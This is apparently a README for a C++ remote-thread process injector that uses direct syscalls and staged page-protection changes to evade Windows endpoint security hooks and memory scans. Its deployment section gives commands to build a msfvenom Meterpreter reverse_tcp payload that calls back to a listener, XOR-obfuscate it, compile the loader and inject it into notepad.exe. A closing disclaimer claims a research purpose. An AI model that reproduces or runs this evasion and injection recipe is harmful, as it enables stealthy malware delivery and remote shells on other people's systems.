# Direct Syscall Remote Thread Injector

This repository contains a low-level C++ reference template designed to evaluate cross-process execution security mechanics and user-mode endpoint telemetry resilience on modern Windows operating systems. The implementation avoids high-level API dependencies and mitigates persistent memory-scanning signatures by interacting directly with the native subsystem kernel boundary.

## Technical Architecture

The application coordinates three native subsystem primitives to manage memory allocation and execution states:

* **Native Kernel Interface Abstraction (Direct Syscalls):** The loader subverts user-mode api monitoring hooks deployed within `ntdll.dll` by standard security products. It leverages custom inline assembly stubs wrapped inside an explicit `extern "C"` linkage block to invoke native system services directly (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`).
* **Sequential Page Protection Transitions:** To prevent the detection of persistent Read/Write/Execute (`RWX`) allocations during heuristic memory scans, the tool enforces granular page discipline. Memory regions are initialized with safe Read/Write (`PAGE_READWRITE`) permissions, populated with the stream payload, and subsequently transitioned to Execute/Read (`PAGE_EXECUTE_READ`) via `VirtualProtectEx` immediately prior to invocation.
* **Isolated Runtime Thread Invocation:** The architecture avoids thread-hijacking and context-manipulation sequences (`NtGetContextThread`, `NtSetContextThread`) that commonly trip behavioral heuristic rules. The primary suspended thread of the target process remains unmanipulated. Code execution is handled by spawning an independent runtime background thread natively via `NtCreateThreadEx`.

## Environment Parameters

* **Compiler Toolchain:** MinGW-w64 / GCC Version 16.1.0+
* **Development Shell:** MSYS2 UCRT64 Environment 
* **Language Standard:** ISO C++17 Standard (`-std=c++17`)
* **Target Platforms:** Native Windows 10 / 11 x64 Architecture

## Deployment Sequence

```bash
# 1. Generate abstract stageless payload blob
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LISTEN_IP LPORT=LISTEN_PORT -f raw -o raw.bin

# 2. Obfuscate payload stream via a static 0xAA XOR loop
python3 -c "data = open('raw.bin', 'rb').read(); open('enc.bin', 'wb').write(bytearray(b ^ 0xAA for b in data))"

# 3. Compile multi-file dependencies natively via UCRT64
g++ -o hollow.exe hollow.cpp evasion.cpp syscalls.cpp utils.cpp -municode -Wl,-subsystem,console -O2 -std=c++17 -static -fno-exceptions -fno-rtti

# 4. Execute application binary wrapper against target image path
.\hollow.exe --target C:\Windows\System32\notepad.exe --payload enc.bin
```

---
Disclaimer: This repository is intended strictly for professional security research, educational telemetry validation, and authorized academic laboratory tracking purposes.
